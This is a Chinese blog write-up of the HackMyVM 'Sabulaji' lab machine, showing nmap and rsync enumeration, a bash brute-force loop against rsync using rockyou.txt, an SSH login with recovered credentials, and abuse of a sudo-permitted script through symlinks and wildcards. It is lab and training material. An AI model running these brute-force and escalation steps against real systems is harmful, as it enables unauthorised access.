@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="
+```shell
+大佬WP：
+https://www.bilibili.com/video/BV1sEMuz6EDh
+http://162.14.82.114/index.php/859/06/12/2025/
+```
+
+
+
+
+### 1. 基本信息
+
+```
+靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=Sabulaji
+```
+
+
+
+```shell
+难度：⭐️⭐️⭐️
+知识点：信息收集，`rsync`文件同步，爆破`rsync`密码，软链接、通配符， `locate`数据库`mlocate.db `，`rsync`提权
+```
+
+### 2. 信息收集
+
+### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.1.166   08:00:27:27:ab:ab       PCS Systemtechnik GmbH
+└─# IP=192.168.1.166
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 08:24 EDT
+Nmap scan report for 192.168.1.166
+Host is up (0.00087s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp  open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: epages
+873/tcp open  rsync   (protocol version 31)
+MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)
+```
+
+开放了`22、80、873`端口，`873`端口有个` rsync `比较可疑
+
+```shell
+└─# nmap -sV --script 'rsync-list-modules' -p 873 $IP
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 10:32 EDT
+Nmap scan report for 192.168.1.166
+Host is up (0.00046s latency).
+
+PORT    STATE SERVICE VERSION
+873/tcp open  rsync   (protocol version 31)
+| rsync-list-modules: 
+|   
+|   public              Public Files
+|_  epages              Secret Documents
+MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)
+```
+
+### 目录扫描
+
+```shell
+└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP:3000 -x.txt,.php,.html
+
+```
+
+目录没啥有用信息，重点去`873`端口的` rsync `服务
+
+### 3.获得`welcome`权限
+
+##### `rsync` 远程文件同步
+
+RSYNC（Remote Sync）是一个用于远程文件同步和备份的开源工具。">
+<meta property="og:title" content="hackmyvm Sabulaji测试记录">
+<meta property="og:description" content="
+```shell
+大佬WP：
+https://www.bilibili.com/video/BV1sEMuz6EDh
+http://162.14.82.114/index.php/859/06/12/2025/
+```
+
+
+
+
+### 1. 基本信息
+
+```
+靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=Sabulaji
+```
+
+
+
+```shell
+难度：⭐️⭐️⭐️
+知识点：信息收集，`rsync`文件同步，爆破`rsync`密码，软链接、通配符， `locate`数据库`mlocate.db `，`rsync`提权
+```
+
+### 2. 信息收集
+
+### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.1.166   08:00:27:27:ab:ab       PCS Systemtechnik GmbH
+└─# IP=192.168.1.166
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 08:24 EDT
+Nmap scan report for 192.168.1.166
+Host is up (0.00087s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp  open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: epages
+873/tcp open  rsync   (protocol version 31)
+MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)
+```
+
+开放了`22、80、873`端口，`873`端口有个` rsync `比较可疑
+
+```shell
+└─# nmap -sV --script 'rsync-list-modules' -p 873 $IP
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 10:32 EDT
+Nmap scan report for 192.168.1.166
+Host is up (0.00046s latency).
+
+PORT    STATE SERVICE VERSION
+873/tcp open  rsync   (protocol version 31)
+| rsync-list-modules: 
+|   
+|   public              Public Files
+|_  epages              Secret Documents
+MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)
+```
+
+### 目录扫描
+
+```shell
+└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP:3000 -x.txt,.php,.html
+
+```
+
+目录没啥有用信息，重点去`873`端口的` rsync `服务
+
+### 3.获得`welcome`权限
+
+##### `rsync` 远程文件同步
+
+RSYNC（Remote Sync）是一个用于远程文件同步和备份的开源工具。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://pingsag3.github.io/post/hackmyvm%20Sabulaji-ce-shi-ji-lu.html">
+<meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
+<title>hackmyvm Sabulaji测试记录</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hackmyvm Sabulaji测试记录</h1>
+<div class="title-right">
+    <a href="https://pingsag3.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/pingsag3/pingsag3.github.io/issues/6" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><div class="highlight highlight-source-shell"><pre class="notranslate">大佬WP：
+https://www.bilibili.com/video/BV1sEMuz6EDh
+http://162.14.82.114/index.php/859/06/12/2025/</pre></div>
+<h3>1. 基本信息</h3>
+<pre class="notranslate"><code class="notranslate">靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=Sabulaji
+</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️⭐️⭐️
+知识点：信息收集，<span class="pl-s"><span class="pl-pds">`</span>rsync<span class="pl-pds">`</span></span>文件同步，爆破<span class="pl-s"><span class="pl-pds">`</span>rsync<span class="pl-pds">`</span></span>密码，软链接、通配符， <span class="pl-s"><span class="pl-pds">`</span>locate<span class="pl-pds">`</span></span>数据库<span class="pl-s"><span class="pl-pds">`</span>mlocate.db <span class="pl-pds">`</span></span>，<span class="pl-s"><span class="pl-pds">`</span>rsync<span class="pl-pds">`</span></span>提权</pre></div>
+<h3>2. 信息收集</h3>
+<h3>Nmap</h3>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
+192.168.1.166   08:00:27:27:ab:ab       PCS Systemtechnik GmbH
+└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.1.166</span>
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 08:24 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.1.166
+Host is up (0.00087s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+<span class="pl-k">|</span> ssh-hostkey: 
+<span class="pl-k">|</span>   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+<span class="pl-k">|</span>   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+<span class="pl-k">|</span>_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp  open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
+<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Debian)
+<span class="pl-k">|</span>_http-title: epages
+873/tcp open  rsync   (protocol version 31)
+MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)</pre></div>
+<p>开放了<code class="notranslate">22、80、873</code>端口，<code class="notranslate">873</code>端口有个<code class="notranslate">rsync</code>比较可疑</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV --script "rsync-list-modules" -p 873 $IP</span>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 10:32 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.1.166
+Host is up (0.00046s latency).
+
+PORT    STATE SERVICE VERSION
+873/tcp open  rsync   (protocol version 31)
+<span class="pl-k">|</span> rsync-list-modules: 
+<span class="pl-k">|</span>   
+<span class="pl-k">|</span>   public              Public Files
+<span class="pl-k">|</span>_  epages              Secret Documents
+MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)</pre></div>
+<h3>目录扫描</h3>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP  -x 403 -e txt,php,html</span>
+
+└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP:3000 -x.txt,.php,.html</span>
+</pre></div>
+<p>目录没啥有用信息，重点去<code class="notranslate">873</code>端口的<code class="notranslate">rsync</code>服务</p>
+<h3>3.获得<code class="notranslate">welcome</code>权限</h3>
+<h5><code class="notranslate">rsync</code> 远程文件同步</h5>
+<p>RSYNC（Remote Sync）是一个用于远程文件同步和备份的开源工具。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>常用的RSYNC参数的解释：</span>
+-a（归档模式）：该参数用于保持文件的所有属性，包括时间戳、权限、所有者等。它是一个常用的参数，用于在源和目标之间保持完全一致。
+-v（详细模式）：该参数用于显示详细的输出信息，包括传输的文件列表、文件大小和传输速度等。
+-r（递归模式）：该参数用于递归地同步目录和子目录，确保源和目标目录之间的所有文件都被同步。
+-z（压缩模式）：该参数用于对传输的数据进行压缩，以减少传输的数据量。这在网络传输较慢的情况下可以提高传输速度。
+-P（进度模式）：该参数用于显示传输的进度信息，包括已传输的文件数量和总体进度等。
+-u（更新模式）：该参数用于仅同步源文件中新增或更新的文件，而不处理目标文件中已存在且没有变化的文件。
+--delete（删除模式）：该参数用于在目标目录中删除与源目录中不同的文件。这对于保持目标目录与源目录完全一致很有用。
+--exclude（排除模式）：该参数用于指定要排除的文件或目录，以避免将其同步到目标目录中。
+--bwlimit=速度（带宽限制）：该参数用于限制传输速度，以防止RSYNC占用过多的带宽。</pre></div>
+<p>在使用rsync命令时，可以通过不同的路径来指定源文件/目录和目标文件/目录</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>本地与远程之间的文件同步（使用SSH）：</span>
+rsync -e ssh /path/to/local/source user@remote:/path/to/destination
+<span class="pl-c"><span class="pl-c">#</span>同步文件夹：</span>
+rsync -av /path/to/source/ /path/to/destination/
+<span class="pl-c"><span class="pl-c">#</span>最常用的命令</span>
+rsync -avz -e <span class="pl-s"><span class="pl-pds">'</span>ssh -p xxx<span class="pl-pds">'</span></span> user@1.1.1.1:/data/test/  /data/test/
+<span class="pl-c"><span class="pl-c">#</span>如果端口和用户也是一致的话，是可以省略的</span>
+rsync -avz 1.1.1.1:/data/test/  /data/test/
+</pre></div>
+<p>在<code class="notranslate">public</code>中可以发现<code class="notranslate">todo.list </code>，先取下来</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> rsync $IP::</span>
+
+public          Public Files
+epages          Secret Documents
+└─<span class="pl-c"><span class="pl-c">#</span> rsync -av --list-only rsync://$IP/public</span>
+
+receiving incremental file list
+drwxr-xr-x          4,096 2025/05/15 12:35:39 <span class="pl-c1">.</span>
+-rw-r--r--            433 2025/05/15 12:35:39 todo.list
+
+sent 20 bytes  received 69 bytes  178.00 bytes/sec
+total size is 433  speedup is 4.87
+└─<span class="pl-c"><span class="pl-c">#</span> rsync -av rsync://$IP:873/public/todo.list .       </span>
+
+receiving incremental file list
+todo.list
+
+sent 43 bytes  received 528 bytes  1,142.00 bytes/sec
+total size is 433  speedup is 0.76
+└─<span class="pl-c"><span class="pl-c">#</span> ls -l todo.list                             </span>
+-rw-r--r-- 1 root sslh 433  5月15日 12:35 todo.list                                                                            </pre></div>
+<p>获得提示信息<code class="notranslate">todo.list</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> cat todo.list         </span>
+To-Do List
+=========
+
+1. sabulaji: Remove private sharing settings
+   - Review all shared files and folders.
+   - Disable any private sharing links or permissions.
+
+2. sabulaji: Change to a strong password
+   - Create a new password (minimum 12 characters, include uppercase, lowercase, numbers, and symbols).
+   - Update the password <span class="pl-k">in</span> the system settings.
+   - Ensure the new password is not reused from other accounts.
+=========</pre></div>
+<p>访问<code class="notranslate">epages</code>需要密码，结合提示信息就是爆破<code class="notranslate">sabulaji</code>账户的密码</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> rsync -av --list-only rsync://$IP/epages</span>
+
+Password: 
+@ERROR: auth failed on module epages
+rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver<span class="pl-k">=</span>3.3.0]</pre></div>
+<h5>爆破<code class="notranslate"> rsync</code>密码</h5>
+<p>编写个<code class="notranslate"> rsync</code>爆破脚本</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> cat bp_rsync.sh</span>
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+<span class="pl-k">for</span> <span class="pl-smi">i</span> <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">$(</span>cat /usr/share/wordlists/rockyou.txt<span class="pl-pds">)</span></span>
+<span class="pl-k">do</span>
+  <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>尝试密码:<span class="pl-smi">$i</span><span class="pl-pds">"</span></span>
+  RSYNC_PASSWORD=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$i</span><span class="pl-pds">"</span></span> rsync --list-only rsync://sabulaji@192.168.1.166:873/epages/ <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>成功!密码:<span class="pl-smi">$i</span><span class="pl-pds">"</span></span> <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">break</span>
+<span class="pl-k">done</span>
+
+└─<span class="pl-c"><span class="pl-c">#</span> ./bp_rsync.sh</span></pre></div>
+<p>获得密码 <code class="notranslate">admin123</code>，要跑很久，在<code class="notranslate">rockyou</code>的九万多行</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">@ERROR: auth failed on module epages
+rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver<span class="pl-k">=</span>3.3.0]
+尝试密码:admin123
+
+drwxr-xr-x          4,096 2025/05/15 12:17:03 <span class="pl-c1">.</span>
+-rw-r--r--         13,312 2025/05/15 12:17:03 secrets.doc
+成功<span class="pl-k">!</span>密码:admin123</pre></div>
+<p>获取 <code class="notranslate">secrets.doc</code>文档</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> rsync -av --list-only rsync://sabulaji@$IP/epages/</span>
+
+Password: 
+receiving incremental file list
+drwxr-xr-x          4,096 2025/05/15 12:17:03 <span class="pl-c1">.</span>
+-rw-r--r--         13,312 2025/05/15 12:17:03 secrets.doc
+
+sent 20 bytes  received 73 bytes  37.20 bytes/sec
+total size is 13,312  speedup is 143.14
+└─<span class="pl-c"><span class="pl-c">#</span> rsync -av  rsync://sabulaji@$IP:873/epages/ ./</span>
+
+Password: 
+receiving incremental file list
+./
+secrets.doc
+
+sent 46 bytes  received 13,435 bytes  3,851.71 bytes/sec
+total size is 13,312  speedup is 0.99
+                                                                                                                                   
+┌──(root㉿kali)-[/tmp]
+└─<span class="pl-c"><span class="pl-c">#</span> ls -l secrets.doc </span>
+-rw-r--r-- 1 root root 13312  5月15日 12:17 secrets.doc</pre></div>
+<p>打开 <code class="notranslate">secrets.doc</code>文档</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>secrets.doc</span>
+The Art of Keeping Secrets
+In a world overflowing with information, keeping secrets is both an art and a challenge. Whether it<span class="pl-s"><span class="pl-pds">'</span>s a personal diary tucked under a mattress or a cryptic message passed in a crowded café, the allure of hidden knowledge captivates us all.</span>
+<span class="pl-s">Take, for example, the old server room in my office. It’s a dusty corner where forgotten machines hum quietly. One of them, a relic from the early 2000s, still runs an FTP service. The admin, in a moment of questionable judgment, named the default account "welcome." I overheard a colleague chuckle about it, saying the password was something absurdly simple, like "P@ssw0rd123!"—hardly a secret worth keeping, but it’s been untouched for years.</span>
+<span class="pl-s">Secrets, however, aren’t just about passwords or hidden files. They’re about intent. A whispered rumor about a project, a coded glance between friends, or even the way we guard our thoughts. The best secrets are those that hide in plain sight, unnoticed by the distracted eye.</span>
+<span class="pl-s">So, how do we master this art? First, blend in. Don’t make your secret obvious. Second, protect it with something stronger than "P@ssw0rd123!"—maybe a phrase only you’d understand. And finally, trust sparingly. Even the most welcoming systems can betray you if you’re not careful.</span>
+<span class="pl-s">In the end, secrets remind us that not everything needs to be shared. Some things are better left unsaid, or at least, left to those who know where to look.</span>
+<span class="pl-s"></span></pre></div>
+<p>里面有一组账号密码信息：<code class="notranslate">welcome:P@ssw0rd123!</code> ，尝试进行登录是<code class="notranslate"> ssh</code>的账号</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> ssh welcome@$IP                                                                       </span>
+welcome@192.168.1.166<span class="pl-s"><span class="pl-pds">'</span>s password: #P@ssw0rd123!</span>
+<span class="pl-s">welcome@Sabulaji:~$ id</span>
+<span class="pl-s">uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)</span></pre></div>
+<h5>拿到<code class="notranslate">user.txt</code></h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:<span class="pl-k">~</span>$ id
+uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
+welcome@Sabulaji:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
+welcome@Sabulaji:<span class="pl-k">~</span>$ ls
+user.txt
+welcome@Sabulaji:<span class="pl-k">~</span>$ cat user.txt 
+</pre></div>
+<h3>4.获得<code class="notranslate">sabulaji</code>权限</h3>
+<p><code class="notranslate">sudo</code>发现 sabulaji 用户能够以 <code class="notranslate">sudo </code>身份运行 <code class="notranslate">/opt/sync.sh</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/home$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> welcome on Sabulaji:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+User welcome may run the following commands on Sabulaji:
+    (sabulaji) NOPASSWD: /opt/sync.sh
+    
+welcome@Sabulaji:/home$ cat /opt/sync.sh
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+<span class="pl-k">if</span> [ <span class="pl-k">-z</span> <span class="pl-smi">$1</span> ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>error: note missing<span class="pl-pds">"</span></span>
+    <span class="pl-c1">exit</span>
+<span class="pl-k">fi</span>
+
+note=<span class="pl-smi">$1</span>
+
+<span class="pl-k">if</span> [[ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$note</span><span class="pl-pds">"</span></span> <span class="pl-k">==</span> <span class="pl-k">*</span><span class="pl-s"><span class="pl-pds">"</span>sabulaji<span class="pl-pds">"</span></span><span class="pl-k">*</span> ]]<span class="pl-k">;</span> <span class="pl-k">then</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>error: forbidden<span class="pl-pds">"</span></span>
+    <span class="pl-c1">exit</span>
+<span class="pl-k">fi</span>
+
+difference=<span class="pl-s"><span class="pl-pds">$(</span>diff /home/sabulaji/personal/notes.txt <span class="pl-smi">$note</span><span class="pl-pds">)</span></span>
+
+<span class="pl-k">if</span> [ <span class="pl-k">-z</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$difference</span><span class="pl-pds">"</span></span> ]<span class="pl-k">;</span> <span class="pl-k">then</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>no update<span class="pl-pds">"</span></span>
+    <span class="pl-c1">exit</span>
+<span class="pl-k">fi</span>
+
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Difference: <span class="pl-smi">$difference</span><span class="pl-pds">"</span></span>
+
+cp <span class="pl-smi">$note</span> /home/sabulaji/personal/notes.txt
+
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>[+] Updated.<span class="pl-pds">"</span></span></pre></div>
+<p>​    脚本首先检查是否提供了参数，如果没有参数就报错退出。然后检查参数中是否包含<code class="notranslate">sabulaji</code>这个字符串，如果包含就拒绝执行。接着比较用户提供的文件与<code class="notranslate">/home/sabulaji/personal/notes.txt</code>的差异，如果没有差异就退出。如果有差异就显示差异内容，复制文件覆盖目标文件，最后提示更新成功。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/passwd
+Difference: 1c1,27
+<span class="pl-k">&lt;</span> Maybe you can find it...
+---
+<span class="pl-k">&gt;</span> root:x:0:0:root:/root:/bin/bash
+<span class="pl-k">&gt;</span> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> bin:x:2:2:bin:/bin:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> sync:x:4:65534:sync:/bin:/bin/sync
+<span class="pl-k">&gt;</span> games:x:5:60:games:/usr/games:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+<span class="pl-k">&gt;</span> welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
+<span class="pl-k">&gt;</span> sabulaji:x:1001:1001::/home/sabulaji:/bin/bash
+[+] Updated.
+welcome@Sabulaji:/tmp$ 
+welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /root/root.txt
+diff: /root/root.txt: Permission denied
+no update
+welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabulaji/personal/notes.txt
+error: forbidden</pre></div>
+<h5><code class="notranslate">关键字过滤</code></h5>
+<p>​		需实现的核心操作是不输入<code class="notranslate">sabulaji</code>关键字的请款下，读取<code class="notranslate">sabulaji</code>目录下的内容，可通过<code class="notranslate">软连接</code>、<code class="notranslate">通配符</code>等方式实现</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:/tmp$ ln -sv /home/sabulaji/ /tmp/a
+<span class="pl-s"><span class="pl-pds">'</span>/tmp/a<span class="pl-pds">'</span></span> -<span class="pl-k">&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>/home/sabulaji/<span class="pl-pds">'</span></span>
+welcome@Sabulaji:/tmp$ ls -l /tmp/a
+lrwxrwxrwx 1 welcome welcome 15 Jun 14 00:57 /tmp/a -<span class="pl-k">&gt;</span> /home/sabulaji/
+welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabu<span class="pl-k">*</span>/personal/notes.txt
+no update
+welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /tmp/a/personal/notes.txt
+no update</pre></div>
+<p>接下来就是找看看<code class="notranslate">/home/sabulaji/</code>目录下藏了啥</p>
+<h5><code class="notranslate">locate</code>数据库<code class="notranslate">mlocate.db </code></h5>
+<p>同时注意到<code class="notranslate">welcome</code>用户多了一个权限 <code class="notranslate">123(mlocate)</code>，翻一下这个属组相关的文件：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Sabulaji:<span class="pl-k">~</span>$ id
+uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
+
+welcome@Sabulaji:/tmp$ find / -group mlocate <span class="pl-k">2&gt;</span>/dev/null
+/usr/bin/mlocate
+/etc/rsyncd.conf
+/etc/rsyncd.secrets
+/var/lib/mlocate/mlocate.db
+/var/cache/locate/locatedb
+/srv/rsync/public/todo.list
